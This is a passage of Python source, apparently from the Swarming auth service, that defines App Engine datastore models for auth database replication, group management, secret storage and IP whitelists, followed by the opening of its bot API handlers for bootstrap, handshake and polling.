ndb.StringProperty(indexed=False, default='')\n  # OAuth2 client secret. Not so secret really, since it's passed to clients.\n  oauth_client_secret = ndb.StringProperty(indexed=False, default='')\n  # Additional OAuth2 client_ids allowed to access the services.\n  oauth_additional_client_ids = ndb.StringProperty(repeated=True, indexed=False)\n\n\nclass AuthReplicationState(ndb.Model, datastore_utils.SerializableModelMixin):\n  \"\"\"Contains state used to control Primary -> Replica replication.\n\n  It's a singleton entity with key replication_state_key() (in same entity\n  groups as root_key()). This entity should be small since it is updated\n  (auth_db_rev is incremented) whenever AuthDB changes.\n\n  Exists in any AuthDB (on Primary and Replicas). Primary updates it whenever\n  changes to AuthDB are made, Replica updates it whenever it receives a push\n  from Primary.\n  \"\"\"\n  # How to convert this entity to or from serializable dict.\n  serializable_properties = {\n    'primary_id': datastore_utils.READABLE,\n    'primary_url': datastore_utils.READABLE,\n    'auth_db_rev': datastore_utils.READABLE,\n    'modified_ts': datastore_utils.READABLE,\n  }\n\n  # For services in Standalone mode it is None.\n  # For services in Primary mode: own GAE application ID.\n  # For services in Replica mode it is a GAE application ID of Primary.\n  primary_id = ndb.StringProperty(indexed=False)\n\n  # For services in Replica mode, root URL of Primary, i.e https://<host>.\n  primary_url = ndb.StringProperty(indexed=False)\n\n  # Revision of auth DB. Increased by 1 with every change that should be\n  # propagate to replicas. Only services in Standalone or Primary mode\n  # update this property by themselves. Replicas receive it from Primary.\n  auth_db_rev = ndb.IntegerProperty(default=0, indexed=False)\n\n  # Time when auth_db_rev was created (by Primary clock). For informational\n  # purposes only. See comment at AuthGroup.modified_ts for explanation why\n  # auto_now is not used.\n  modified_ts = ndb.DateTimeProperty(auto_now_add=True, indexed=False)\n\n\ndef replicate_auth_db():\n  \"\"\"Increments auth_db_rev, updates historical log, triggers replication.\n\n  Must be called once from inside a transaction (right before exiting it).\n\n  Should only be called for services in Standalone or Primary modes. Will raise\n  ValueError if called on Replica. When called for service in Standalone mode,\n  will update auth_db_rev but won't kick any replication. For services in\n  Primary mode will also initiate replication by calling callback set in\n  'configure_as_primary'. The callback usually transactionally enqueues a task\n  (to gracefully handle transaction rollbacks).\n\n  WARNING: This function relies on a valid transaction context. NDB hooks and\n  asynchronous operations are known to be buggy in this regard: NDB hook for\n  an async operation in a transaction may be called with a wrong context\n  (main event loop context instead of transaction context). One way to work\n  around that is to monkey patch NDB (as done here: https://goo.gl/1yASjL).\n  Another is to not use hooks at all. There's no way to differentiate between\n  sync and async modes of an NDB operation from inside a hook. And without a\n  strict assert it's very easy to forget about \"Do not use put_async\" warning.\n  For that reason _post_put_hook is NOT used and replicate_auth_db() should be\n  called explicitly whenever relevant part of root_key() entity group is\n  updated.\n\n  Returns:\n    New AuthDB revision number.\n  \"\"\"\n  assert ndb.in_transaction()\n  txn = _get_pending_auth_db_transaction()\n  txn.commit()\n  if is_primary():\n    _replication_callback(txn.replication_state)\n  return txn.replication_state.auth_db_rev\n\n\n################################################################################\n## Auth DB transaction details (used for historical log of changes).\n\n\n_commit_callbacks = []\n\n\ndef commit_callback(cb):\n  \"\"\"Adds a callback that's called before AuthDB transaction is committed.\n\n  Can be used as decorator. Adding a callback second time is noop.\n\n  Args:\n    cb: function that takes single auth_db_rev argument as input.\n  \"\"\"\n  if cb not in _commit_callbacks:\n    _commit_callbacks.append(cb)\n  return cb\n\n\ndef _get_pending_auth_db_transaction():\n  \"\"\"Used internally to keep track of changes done in the transaction.\n\n  Returns:\n    Instance of _AuthDBTransaction (stored in the transaction context).\n  \"\"\"\n  # Use transaction context to store the object. Note that each transaction\n  # retry gets its own new transaction context which is what we need,\n  # see ndb/context.py, 'transaction' tasklet, around line 982 (for SDK 1.9.6).\n  assert ndb.in_transaction()\n  ctx = ndb.get_context()\n  txn = getattr(ctx, '_auth_db_transaction', None)\n  if txn:\n    return txn\n\n  # Prepare next AuthReplicationState (auth_db_rev +1).\n  state = replication_state_key().get()\n  if not state:\n    primary_id = app_identity.get_application_id() if is_primary() else None\n    state = AuthReplicationState(\n        key=replication_state_key(),\n        primary_id=primary_id,\n        auth_db_rev=0)\n  # Assert Primary or Standalone. Replicas can't increment auth db revision.\n  if not is_primary() and state.primary_id:\n    raise ValueError('Can\\'t modify Auth DB on Replica')\n  state.auth_db_rev += 1\n  state.modified_ts = utils.utcnow()\n\n  # Store the state in the transaction context. Used in replicate_auth_db(...)\n  # later.\n  txn = _AuthDBTransaction(state)\n  ctx._auth_db_transaction = txn\n  return txn\n\n\nclass _AuthDBTransaction(object):\n  \"\"\"Keeps track of entities updated or removed in current transaction.\"\"\"\n\n  _Change = collections.namedtuple('_Change', 'entity deletion comment')\n\n  def __init__(self, replication_state):\n    self.replication_state = replication_state\n    self.changes = [] # list of _Change tuples\n    self.committed = False\n\n  def record_change(self, entity, deletion, modified_by, modified_ts, comment):\n    assert not self.committed\n    assert isinstance(entity, AuthVersionedEntityMixin)\n    assert all(entity.key != c.entity.key for c in self.changes)\n\n    # Mutate the main entity (the one used to serve online requests).\n    entity.modified_by = modified_by\n    entity.modified_ts = modified_ts\n    entity.auth_db_prev_rev = entity.auth_db_rev # can be None for new entities\n    entity.auth_db_rev = self.replication_state.auth_db_rev\n\n    # Keep a historical copy. Delay make_historical_copy call until the commit.\n    # Here (in 'record_change') entity may not have all the fields updated yet.\n    self.changes.append(self._Change(entity, deletion, comment))\n\n  def commit(self):\n    assert not self.committed\n    puts = [\n      c.entity.make_historical_copy(c.deletion, c.comment)\n      for c in self.changes\n    ]\n    ndb.put_multi(puts + [self.replication_state])\n    for cb in _commit_callbacks:\n      cb(self.replication_state.auth_db_rev)\n    self.committed = True\n\n\nclass _AuthDBHistoricalEntity(ndb.Model):\n  \"\"\"Base class for *History magic class in AuthVersionedEntityMixin.\n\n  In addition to properties defined here the child classes (*History) also\n  always inherit (for some definition of \"inherit\") properties from\n  AuthVersionedEntityMixin.\n\n  See get_historical_copy_class().\n  \"\"\"\n  # Historical entities are not intended to be read often, and updating the\n  # cache will make AuthDB transactions only slower.\n  _use_cache = False\n  _use_memcache = False\n\n  # True if entity was deleted in the given revision.\n  auth_db_deleted = ndb.BooleanProperty(indexed=False)\n  # Comment string passed to record_revision or record_deletion.\n  auth_db_change_comment = ndb.StringProperty(indexed=False)\n  # A GAE module version that committed the change.\n  auth_db_app_version = ndb.StringProperty(indexed=False)\n\n  def get_previous_historical_copy_key(self):\n    \"\"\"Returns ndb.Key of *History entity matching auth_db_prev_rev revision.\"\"\"\n    if self.auth_db_prev_rev is None:\n      return None\n    return ndb.Key(\n        self.__class__, self.key.id(),\n        parent=historical_revision_key(self.auth_db_prev_rev))\n\n\n################################################################################\n## Groups.\n\n\nclass AuthGroup(\n    ndb.Model,\n    AuthVersionedEntityMixin,\n    datastore_utils.SerializableModelMixin):\n  \"\"\"A group of identities, entity id is a group name.\n\n  Parent is AuthGlobalConfig entity keyed at root_key().\n\n  Primary service holds authoritative list of Groups, that gets replicated to\n  all Replicas.\n  \"\"\"\n  # How to convert this entity to or from serializable dict.\n  serializable_properties = {\n    'members': datastore_utils.READABLE | datastore_utils.WRITABLE,\n    'globs': datastore_utils.READABLE | datastore_utils.WRITABLE,\n    'nested': datastore_utils.READABLE | datastore_utils.WRITABLE,\n    'description': datastore_utils.READABLE | datastore_utils.WRITABLE,\n    'owners': datastore_utils.READABLE | datastore_utils.WRITABLE,\n    'created_ts': datastore_utils.READABLE,\n    'created_by': datastore_utils.READABLE,\n    'modified_ts': datastore_utils.READABLE,\n    'modified_by': datastore_utils.READABLE,\n  }\n\n  # List of members that are explicitly in this group. Indexed.\n  members = IdentityProperty(repeated=True)\n  # List of identity-glob expressions (like 'user:*@example.com'). Indexed.\n  globs = IdentityGlobProperty(repeated=True)\n  # List of nested group names. Indexed.\n  nested = ndb.StringProperty(repeated=True)\n\n  # Human readable description.\n  description = ndb.TextProperty(default='')\n  # A name of the group that can modify or delete this group.\n  owners = ndb.StringProperty(default=ADMIN_GROUP)\n\n  # When the group was created.\n  created_ts = ndb.DateTimeProperty()\n  # Who created the group.\n  created_by = IdentityProperty()\n\n\ndef group_key(group):\n  \"\"\"Returns ndb.Key for AuthGroup entity.\"\"\"\n  return ndb.Key(AuthGroup, group, parent=root_key())\n\n\ndef is_empty_group(group):\n  \"\"\"Returns True if group is missing or completely empty.\"\"\"\n  group = group_key(group).get()\n  return not group or not(group.members or group.globs or group.nested)\n\n\ndef is_valid_group_name(name):\n  \"\"\"True if string looks like a valid group name.\"\"\"\n  return bool(GROUP_NAME_RE.match(name))\n\n\ndef is_external_group_name(name):\n  \"\"\"True if group is imported from outside and is not writable.\"\"\"\n  return is_valid_group_name(name) and '/' in name\n\n\n@ndb.transactional\ndef bootstrap_group(group, identities, description=''):\n  \"\"\"Makes a group (if not yet exists) and adds |identities| to it as members.\n\n  Returns True if modified the group, False if identities are already there.\n  \"\"\"\n  key = group_key(group)\n  entity = key.get()\n  if entity and all(i in entity.members for i in identities):\n    return False\n  now = utils.utcnow()\n  if not entity:\n    entity = AuthGroup(\n        key=key,\n        description=description,\n        created_ts=now,\n        created_by=get_service_self_identity())\n  for i in identities:\n    if i not in entity.members:\n      entity.members.append(i)\n  entity.record_revision(\n      modified_by=get_service_self_identity(),\n      modified_ts=now,\n      comment='Bootstrap')\n  entity.put()\n  replicate_auth_db()\n  return True\n\n\ndef find_referencing_groups(group):\n  \"\"\"Finds groups that reference the specified group as nested group or owner.\n\n  Used to verify that |group| is safe to delete, i.e. no other group is\n  depending on it.\n\n  Returns:\n    Set of names of referencing groups.\n  \"\"\"\n  nesting_groups = AuthGroup.query(\n      AuthGroup.nested == group,\n      ancestor=root_key()).fetch_async(keys_only=True)\n  owned_groups = AuthGroup.query(\n      AuthGroup.owners == group,\n      ancestor=root_key()).fetch_async(keys_only=True)\n  refs = set()\n  refs.update(key.id() for key in nesting_groups.get_result())\n  refs.update(key.id() for key in owned_groups.get_result())\n  return refs\n\n\ndef get_missing_groups(groups):\n  \"\"\"Given a list of group names, returns a list of groups that do not exist.\"\"\"\n  # We need to iterate over |groups| twice. It won't work if |groups|\n  # is a generator. So convert to list first.\n  groups = list(groups)\n  entities = ndb.get_multi(group_key(name) for name in groups)\n  return [name for name, ent in zip(groups, entities) if not ent]\n\n\ndef find_group_dependency_cycle(group):\n  \"\"\"Searches for dependency cycle between nested groups.\n\n  Traverses the dependency graph starting from |group|, fetching all necessary\n  groups from datastore along the way.\n\n  Args:\n    group: instance of AuthGroup to start traversing from. It doesn't have to be\n        committed to Datastore itself (but all its nested groups should be\n        there already).\n\n  Returns:\n    List of names of groups that form a cycle or empty list if no cycles.\n  \"\"\"\n  # It is a depth-first search on a directed graph with back edge detection.\n  # See http://www.cs.nyu.edu/courses/summer04/G22.1170-001/6a-Graphs-More.pdf\n\n  # Cache of already fetched groups.\n  groups = {group.key.id(): group}\n\n  # List of groups that are completely explored (all subtree is traversed).\n  visited = []\n  # Stack of groups that are being explored now. In case cycle is detected\n  # it would contain that cycle.\n  visiting = []\n\n  def visit(group):\n    \"\"\"Recursively explores |group| subtree, returns True if finds a cycle.\"\"\"\n    assert group not in visiting\n    assert group not in visited\n\n    # Load bodies of nested groups not seen so far into |groups|.\n    entities = ndb.get_multi(\n        group_key(name) for name in group.nested if name not in groups)\n    groups.update({entity.key.id(): entity for entity in entities if entity})\n\n    visiting.append(group)\n    for nested in group.nested:\n      obj = groups.get(nested)\n      # Do not crash if non-existent group is referenced somehow.\n      if not obj:\n        continue\n      # Cross edge. Can happen in diamond-like graph, not a cycle.\n      if obj in visited:\n        continue\n      # Back edge: |group| references its own ancestor -> cycle.\n      if obj in visiting:\n        return True\n      # Explore subtree.\n      if visit(obj):\n        return True\n    visiting.pop()\n\n    visited.append(group)\n    return False\n\n  visit(group)\n  return [group.key.id() for group in visiting]\n\n\n################################################################################\n## Secrets store.\n\n\nclass AuthSecretScope(ndb.Model):\n  \"\"\"Entity to act as parent entity for AuthSecret.\n\n  Parent is AuthGlobalConfig entity keyed at root_key().\n\n  Id of this entity defines scope of secret keys that have this entity as\n  a parent. Possible scopes are 'local' and 'global'.\n\n  Secrets in 'local' scope never leave Datastore they are stored in and they\n  are different for each service (even for Replicas). Only service that\n  generated a local secret knows it.\n\n  Secrets in 'global' scope are known to all services (via Primary -> Replica\n  DB replication mechanism). Source of truth for global secrets is in Primary's\n  Datastore.\n  \"\"\"\n\n\ndef secret_scope_key(scope):\n  \"\"\"Key of AuthSecretScope entity for a given scope ('global' or 'local').\"\"\"\n  return ndb.Key(AuthSecretScope, scope, parent=root_key())\n\n\nclass AuthSecret(ndb.Model):\n  \"\"\"Some service-wide named secret blob.\n\n  Entity can be a child of:\n    * Key(AuthSecretScope, 'global', parent=root_key()):\n        Global secrets replicated across all services.\n    * Key(AuthSecretScope, 'local', parent=root_key()):\n        Secrets local to the current service.\n\n  There should be only very limited number of AuthSecret entities around. AuthDB\n  fetches them all at once. Do not use this entity for per-user secrets.\n\n  Holds most recent value of a secret as well as several previous values. Most\n  recent value is used to generate new tokens, previous values may be used to\n  validate existing tokens. That way secret can be rotated without invalidating\n  any existing outstanding tokens.\n  \"\"\"\n  # Last several values of a secret, with current value in front.\n  values = ndb.BlobProperty(repeated=True, indexed=False)\n\n  # When secret was modified last time.\n  modified_ts = ndb.DateTimeProperty(auto_now_add=True)\n  # Who modified the secret last time.\n  modified_by = IdentityProperty()\n\n  @classmethod\n  def bootstrap(cls, name, scope, length=32):\n    \"\"\"Creates a secret if it doesn't exist yet.\n\n    Args:\n      name: name of the secret.\n      scope: 'local' or 'global', see doc string for AuthSecretScope. 'global'\n          scope should only be used on Primary service.\n      length: length of the secret to generate if secret doesn't exist yet.\n\n    Returns:\n      Instance of AuthSecret (creating it if necessary) with random secret set.\n    \"\"\"\n    # Note that 'get_or_insert' is a bad fit here. With 'get_or_insert' we'd\n    # have to call os.urandom every time we want to get a key. It's a waste of\n    # time and entropy.\n    if scope not in ('local', 'global'):\n      raise ValueError('Invalid secret scope: %s' % scope)\n    key = ndb.Key(cls, name, parent=secret_scope_key(scope))\n    entity = key.get()\n    if entity is not None:\n      return entity\n    @ndb.transactional\n    def create():\n      entity = key.get()\n      if entity is not None:\n        return entity\n      logging.info('Creating new secret key %s in %s scope', name, scope)\n      # Global keys can only be created on Primary or Standalone service.\n      if scope == 'global' and is_replica():\n        raise ValueError('Can\\'t bootstrap global key on Replica')\n      entity = cls(\n          key=key,\n          values=[os.urandom(length)],\n          modified_by=get_service_self_identity())\n      entity.put()\n      # Only global keys are part of replicated state.\n      if scope == 'global':\n        replicate_auth_db()\n      return entity\n    return create()\n\n\n################################################################################\n## IP whitelist.\n\n\nclass AuthIPWhitelistAssignments(ndb.Model, AuthVersionedEntityMixin):\n  \"\"\"A singleton entity with \"identity -> AuthIPWhitelist to use\" mapping.\n\n  Entity key is ip_whitelist_assignments_key(). Parent entity is root_key().\n\n  See AuthIPWhitelist for more info about IP whitelists.\n  \"\"\"\n  class Assignment(ndb.Model):\n    # Identity name to limit by IP whitelist. Unique key in 'assignments' list.\n    identity = IdentityProperty()\n    # Name of IP whitelist to use (see AuthIPWhitelist).\n    ip_whitelist = ndb.StringProperty()\n    # Why the assignment was created.\n    comment = ndb.StringProperty()\n    # When the assignment was created.\n    created_ts = ndb.DateTimeProperty()\n    # Who created the assignment.\n    created_by = IdentityProperty()\n\n  # Holds all the assignments.\n  assignments = ndb.LocalStructuredProperty(Assignment, repeated=True)\n\n\nclass AuthIPWhitelist(\n    ndb.Model,\n    AuthVersionedEntityMixin,\n    datastore_utils.SerializableModelMixin):\n  \"\"\"A named set of whitelisted IPv4 and IPv6 subnets.\n\n  Can be assigned to individual user accounts to forcibly limit them only to\n  particular IP addresses, e.g. it can be used to enforce that specific service\n  account is used only from some known IP range. The mapping between accounts\n  and IP whitelists is stored in AuthIPWhitelistAssignments.\n\n  Entity id is a name of the whitelist. Parent entity is root_key().\n\n  There's a special IP whitelist named 'bots' that can be used to list\n  IP addresses of machines the service trusts unconditionally. Requests from\n  such machines doesn't have to have any additional credentials attached.\n  Requests will be authenticated as coming from identity 'bot:<IP address>'.\n  \"\"\"\n  # How to convert this entity to or from serializable dict.\n  serializable_properties = {\n    'subnets': datastore_utils.READABLE | datastore_utils.WRITABLE,\n    'description': datastore_utils.READABLE | datastore_utils.WRITABLE,\n    'created_ts': datastore_utils.READABLE,\n    'created_by': datastore_utils.READABLE,\n    'modified_ts': datastore_utils.READABLE,\n    'modified_by': datastore_utils.READABLE,\n  }\n\n  # The list of subnets. The validator is used only as a last measure. JSON API\n  # handler should do validation too.\n  subnets = ndb.StringProperty(\n      repeated=True, validator=lambda _, val: ipaddr.normalize_subnet(val))\n\n  # Human readable description.\n  description = ndb.TextProperty(default='')\n\n  # When the list was created.\n  created_ts = ndb.DateTimeProperty()\n  # Who created the list.\n  created_by = IdentityProperty()\n\n  def is_ip_whitelisted(self, ip):\n    \"\"\"Returns True if ipaddr.IP is in the whitelist.\"\"\"\n    # TODO(vadimsh): If number of subnets to check grows it makes sense to add\n    # an internal cache to 'subnet_from_string' (sort of like in re.compile).\n    return any(\n        ipaddr.is_in_subnet(ip, ipaddr.subnet_from_string(net))\n        for net in self.subnets)\n\n\ndef ip_whitelist_key(name):\n  \"\"\"Returns ndb.Key for AuthIPWhitelist entity given its name.\"\"\"\n  return ndb.Key(AuthIPWhitelist, name, parent=root_key())\n\n\ndef is_valid_ip_whitelist_name(name):\n  \"\"\"True if string looks like a valid IP whitelist name.\"\"\"\n  return bool(IP_WHITELIST_NAME_RE.match(name))\n\n\n@ndb.transactional\ndef bootstrap_ip_whitelist(name, subnets, description=''):\n  \"\"\"Adds subnets to an IP whitelist if not there yet.\n\n  Can be used on local dev appserver to add 127.0.0.1 to IP whitelist during\n  startup. Should not be used from request handlers.\n\n  Args:\n    name: IP whitelist name to add a subnet to.\n    subnets: IP subnet to add (as a list of strings).\n    description: description of IP whitelist (if new entity is created).\n\n  Returns:\n    True if entry was added, False if it is already there or subnet is invalid.\n  \"\"\"\n  assert isinstance(subnets, (list, tuple))\n  try:\n    subnets = [ipaddr.normalize_subnet(s) for s in subnets]\n  except ValueError:\n    return False\n  key = ip_whitelist_key(name)\n  entity = key.get()\n  if entity and all(s in entity.subnets for s in subnets):\n    return False\n  now = utils.utcnow()\n  if not entity:\n    entity = AuthIPWhitelist(\n        key=key,\n        description=description,\n        created_ts=now,\n        created_by=get_service_self_identity())\n  for s in subnets:\n    if s not in entity.subnets:\n      entity.subnets.append(s)\n  entity.record_revision(\n      modified_by=get_service_self_identity(),\n      modified_ts=now,\n      comment='Bootstrap')\n  entity.put()\n  replicate_auth_db()\n  return True\n\n\ndef bootstrap_loopback_ips():\n  \"\"\"Adds 127.0.0.1 and ::1 to 'bots' IP whitelist.\n\n  Useful on local dev server and in tests. Must not be used in production.\n\n  Returns list of corresponding bot Identities.\n  \"\"\"\n  # See api.py, AuthDB.verify_ip_whitelisted for IP -> Identity conversion.\n  assert utils.is_local_dev_server()\n  bootstrap_ip_whitelist(BOTS_IP_WHITELIST, ['127.0.0.1', '::1'], 'Local bots')\n  return [\n    Identity(IDENTITY_BOT, 'whitelisted-ip'),\n    Identity(IDENTITY_BOT, '127.0.0.1'),\n    Identity(IDENTITY_BOT, '0-0-0-0-0-0-0-1'),\n  ]\n\n\n@ndb.transactional\ndef bootstrap_ip_whitelist_assignment(identity, ip_whitelist, comment=''):\n  \"\"\"Sets a mapping \"identity -> IP whitelist to use\" for some account.\n\n  Replaces existing assignment. Can be used on local dev appserver to configure\n  IP whitelist assignments during startup or in tests. Should not be used from\n  request handlers.\n\n  Args:\n    identity: Identity to modify.\n    ip_whitelist: name of AuthIPWhitelist to assign.\n    comment: comment to set.\n\n  Returns:\n    True if IP whitelist assignment was modified, False if it was already set.\n  \"\"\"\n  entity = (\n      ip_whitelist_assignments_key().get() or\n      AuthIPWhitelistAssignments(key=ip_whitelist_assignments_key()))\n\n  found = False\n  for assignment in entity.assignments:\n    if assignment.identity == identity:\n      if assignment.ip_whitelist == ip_whitelist:\n        return False\n      assignment.ip_whitelist = ip_whitelist\n      assignment.comment = comment\n      found = True\n      break\n\n  now = utils.utcnow()\n  if not found:\n    entity.assignments.append(\n        AuthIPWhitelistAssignments.Assignment(\n            identity=identity,\n            ip_whitelist=ip_whitelist,\n            comment=comment,\n            created_ts=now,\n            created_by=get_service_self_identity()))\n\n  entity.record_revision(\n      modified_by=get_service_self_identity(),\n      modified_ts=now,\n      comment='Bootstrap')\n  entity.put()\n  replicate_auth_db()\n  return True\n\n\ndef fetch_ip_whitelists():\n  \"\"\"Fetches AuthIPWhitelistAssignments and relevant AuthIPWhitelist entities.\n\n  Returns:\n    (AuthIPWhitelistAssignments, list of AuthIPWhitelist).\n  \"\"\"\n  assignments = (\n      ip_whitelist_assignments_key().get() or\n      AuthIPWhitelistAssignments(key=ip_whitelist_assignments_key()))\n\n  names = set(a.ip_whitelist for a in assignments.assignments)\n  names.add(BOTS_IP_WHITELIST)\n\n  whitelists = ndb.get_multi(ip_whitelist_key(n) for n in names)\n  whitelists = sorted(filter(None, whitelists), key=lambda x: x.key.id())\n  return assignments, whitelists\n/n/n/nappengine/swarming/handlers_bot.py/n/n# Copyright 2015 The Swarming Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\n\"\"\"Internal bot API handlers.\"\"\"\n\nimport base64\nimport json\nimport logging\nimport textwrap\n\nimport webob\nimport webapp2\n\nfrom google.appengine.api import app_identity\nfrom google.appengine.api import datastore_errors\nfrom google.appengine.datastore import datastore_query\nfrom google.appengine import runtime\nfrom google.appengine.ext import ndb\n\nfrom components import auth\nfrom components import ereporter2\nfrom components import utils\nfrom server import acl\nfrom server import bot_code\nfrom server import bot_management\nfrom server import stats\nfrom server import task_pack\nfrom server import task_scheduler\nfrom server import task_to_run\n\n\ndef has_unexpected_subset_keys(expected_keys, minimum_keys, actual_keys, name):\n  \"\"\"Returns an error if unexpected keys are present or expected keys are\n  missing.\n\n  Accepts optional keys.\n\n  This is important to catch typos.\n  \"\"\"\n  actual_keys = frozenset(actual_keys)\n  superfluous = actual_keys - expected_keys\n  missing = minimum_keys - actual_keys\n  if superfluous or missing:\n    msg_missing = (' missing: %s' % sorted(missing)) if missing else ''\n    msg_superfluous = (\n        (' superfluous: %s' % sorted(superfluous)) if superfluous else '')\n    return 'Unexpected %s%s%s; did you make a typo?' % (\n        name, msg_missing, msg_superfluous)\n\n\ndef has_unexpected_keys(expected_keys, actual_keys, name):\n  \"\"\"Return an error if unexpected keys are present or expected keys are\n  missing.\n  \"\"\"\n  return has_unexpected_subset_keys(\n      expected_keys, expected_keys, actual_keys, name)\n\n\ndef log_unexpected_subset_keys(\n    expected_keys, minimum_keys, actual_keys, request, source, name):\n  \"\"\"Logs an error if unexpected keys are present or expected keys are missing.\n\n  Accepts optional keys.\n\n  This is important to catch typos.\n  \"\"\"\n  message = has_unexpected_subset_keys(\n    expected_keys, minimum_keys, actual_keys, name)\n  if message:\n    ereporter2.log_request(request, source=source, message=message)\n  return message\n\n\ndef log_unexpected_keys(expected_keys, actual_keys, request, source, name):\n  \"\"\"Logs an error if unexpected keys are present or expected keys are missing.\n  \"\"\"\n  return log_unexpected_subset_keys(\n      expected_keys, expected_keys, actual_keys, request, source, name)\n\n\ndef has_missing_keys(minimum_keys, actual_keys, name):\n  \"\"\"Returns an error if expected keys are not present.\n\n  Do not warn about unexpected keys.\n  \"\"\"\n  actual_keys = frozenset(actual_keys)\n  missing = minimum_keys - actual_keys\n  if missing:\n    msg_missing = (' missing: %s' % sorted(missing)) if missing else ''\n    return 'Unexpected %s%s; did you make a typo?' % (name, msg_missing)\n\n\nclass BootstrapHandler(auth.AuthenticatingHandler):\n  \"\"\"Returns python code to run to bootstrap a swarming bot.\"\"\"\n\n  @auth.require(acl.is_bot)\n  def get(self):\n    self.response.headers['Content-Type'] = 'text/x-python'\n    self.response.headers['Content-Disposition'] = (\n        'attachment; filename=\"swarming_bot_bootstrap.py\"')\n    self.response.out.write(\n        bot_code.get_bootstrap(self.request.host_url).content)\n\n\nclass BotCodeHandler(auth.AuthenticatingHandler):\n  \"\"\"Returns a zip file with all the files required by a bot.\n\n  Optionally specify the hash version to download. If so, the returned data is\n  cacheable.\n  \"\"\"\n\n  @auth.require(acl.is_bot)\n  def get(self, version=None):\n    if version:\n      expected = bot_code.get_bot_version(self.request.host_url)\n      if version != expected:\n        # This can happen when the server is rapidly updated.\n        logging.error('Requested Swarming bot %s, have %s', version, expected)\n        self.abort(404)\n      self.response.headers['Cache-Control'] = 'public, max-age=3600'\n    else:\n      self.response.headers['Cache-Control'] = 'no-cache, no-store'\n    self.response.headers['Content-Type'] = 'application/octet-stream'\n    self.response.headers['Content-Disposition'] = (\n        'attachment; filename=\"swarming_bot.zip\"')\n    self.response.out.write(\n        bot_code.get_swarming_bot_zip(self.request.host_url))\n\n\nclass _BotBaseHandler(auth.ApiHandler):\n  \"\"\"\n  Request body is a JSON dict:\n    {\n      \"dimensions\": <dict of properties>,\n      \"state\": <dict of properties>,\n      \"version\": <sha-1 of swarming_bot.zip uncompressed content>,\n    }\n  \"\"\"\n\n  EXPECTED_KEYS = {u'dimensions', u'state', u'version'}\n  REQUIRED_STATE_KEYS = {u'running_time', u'sleep_streak'}\n\n  # TODO(vadimsh): Remove once bots use X-Whitelisted-Bot-Id or OAuth.\n  xsrf_token_enforce_on = ()\n\n  def _process(self):\n    \"\"\"Returns True if the bot has invalid parameter and should be automatically\n    quarantined.\n\n    Does one DB synchronous GET.\n\n    Returns:\n      tuple(request, bot_id, version, state, dimensions, quarantined_msg)\n    \"\"\"\n    request = self.parse_body()\n    version = request.get('version', None)\n\n    dimensions = request.get('dimensions', {})\n    state = request.get('state', {})\n    bot_id = None\n    if dimensions.get('id'):\n      dimension_id = dimensions['id']\n      if (isinstance(dimension_id, list) and len(dimension_id) == 1\n          and isinstance(dimension_id[0], unicode)):\n        bot_id = dimensions['id'][0]\n\n    # The bot may decide to \"self-quarantine\" itself. Accept both via\n    # dimensions or via state. See bot_management._BotCommon.quarantined for\n    # more details.\n    if (bool(dimensions.get('quarantined')) or\n        bool(state.get('quarantined'))):\n      return request, bot_id, version, state, dimensions, 'Bot self-quarantined'\n\n    quarantined_msg = None\n    # Use a dummy 'for' to be able to break early from the block.\n    for _ in [0]:\n\n      quarantined_msg = has_unexpected_keys(\n          self.EXPECTED_KEYS, request, 'keys')\n      if quarantined_msg:\n        break\n\n      quarantined_msg = has_missing_keys(\n          self.REQUIRED_STATE_KEYS, state, 'state')\n      if quarantined_msg:\n        break\n\n      if not bot_id:\n        quarantined_msg = 'Missing bot id'\n        break\n\n      if not all(\n          isinstance(key, unicode) and\n          isinstance(values, list) and\n          all(isinstance(value, unicode) for value in values)\n          for key, values in dimensions.iteritems()):\n        quarantined_msg = (\n            'Invalid dimensions type:\\n%s' % json.dumps(dimensions,\n              sort_keys=True, indent=2, separators=(',', ': ')))\n        break\n\n      dimensions_count = task_to_run.dimensions_powerset_count(dimensions)\n      if dimensions_count > task_to_run.MAX_DIMENSIONS:\n        quarantined_msg = 'Dimensions product %d is too high' % dimensions_count\n        break\n\n    if quarantined_msg:\n      line = 'Quarantined Bot\\nhttps://%s/restricted/bot/%s\\n%s' % (\n          app_identity.get_default_version_hostname(), bot_id,\n          quarantined_msg)\n      ereporter2.log_request(self.request, source='bot', message=line)\n      return request, bot_id, version, state, dimensions, quarantined_msg\n\n    # Look for admin enforced quarantine.\n    bot_settings = bot_management.get_settings_key(bot_id).get()\n    if bool(bot_settings and bot_settings.quarantined):\n      return request, bot_id, version, state, dimensions, 'Quarantined by admin'\n\n    return request, bot_id, version, state, dimensions, None\n\n\nclass BotHandshakeHandler(_BotBaseHandler):\n  \"\"\"First request to be called to get initial data like XSRF token.\n\n  The bot is server-controled so the server doesn't have to support multiple API\n  version. When running a task, the bot sync the the version specific URL. Once\n  abot finished its currently running task, it'll be immediately be upgraded\n  after on its next poll.\n\n  This endpoint does not return commands to the bot, for example to upgrade\n  itself. It'll be told so when it does its first poll.\n\n  Response body is a JSON dict:\n    {\n      \"bot_version\": <sha-1 of swarming_bot.zip uncompressed content>,\n      \"server_version\": \"138-193f1f3\",\n      \"xsrf_token\": \"......\",\n    }\n  \"\"\"\n\n  # This handler is called to get XSRF token, there's nothing to enforce yet.\n  xsrf_token_enforce_on = ()\n\n  @auth.require_xsrf_token_request\n  @auth.require(acl.is_bot)\n  def post(self):\n    (_request, bot_id, version, state,\n        dimensions, quarantined_msg) = self._process()\n    bot_management.bot_event(\n        event_type='bot_connected', bot_id=bot_id,\n        external_ip=self.request.remote_addr, dimensions=dimensions,\n        state=state, version=version, quarantined=bool(quarantined_msg),\n        task_id='', task_name=None, message=quarantined_msg)\n\n    data = {\n      # This access token will be used to validate each subsequent request.\n      'bot_version': bot_code.get_bot_version(self.request.host_url),\n      'expiration_sec': auth.handler.XSRFToken.expiration_sec,\n      'server_version': utils.get_app_version(),\n      'xsrf_token': self.generate_xsrf_token(),\n    }\n    self.send_response(data)\n\n\nclass BotPollHandler(_BotBaseHandler):\n  \"\"\"The bot polls for a task; returns either a task, update command or sleep.\n\n  In case of exception on the bot, this is enough to get it just far enough to\n  eventually self-update to a working version. This is to ensure that coding\n  errors in bot code doesn't kill all the fleet at once, they should still be up\n  just enough to be able to self-update again even if they don't get task\n  assigned anymore.\n  \"\"\"\n\n  @auth.require(acl.is_bot)\n  def post(self):\n    \"\"\"Handles a polling request.\n\n    Be very permissive on missing values. This can happen because of errors\n    on the bot, *we don't want to deny them the capacity to update*, so that the\n    bot code is eventually fixed and the bot self-update to this working code.\n\n    It makes recovery of the fleet in case of catastrophic failure 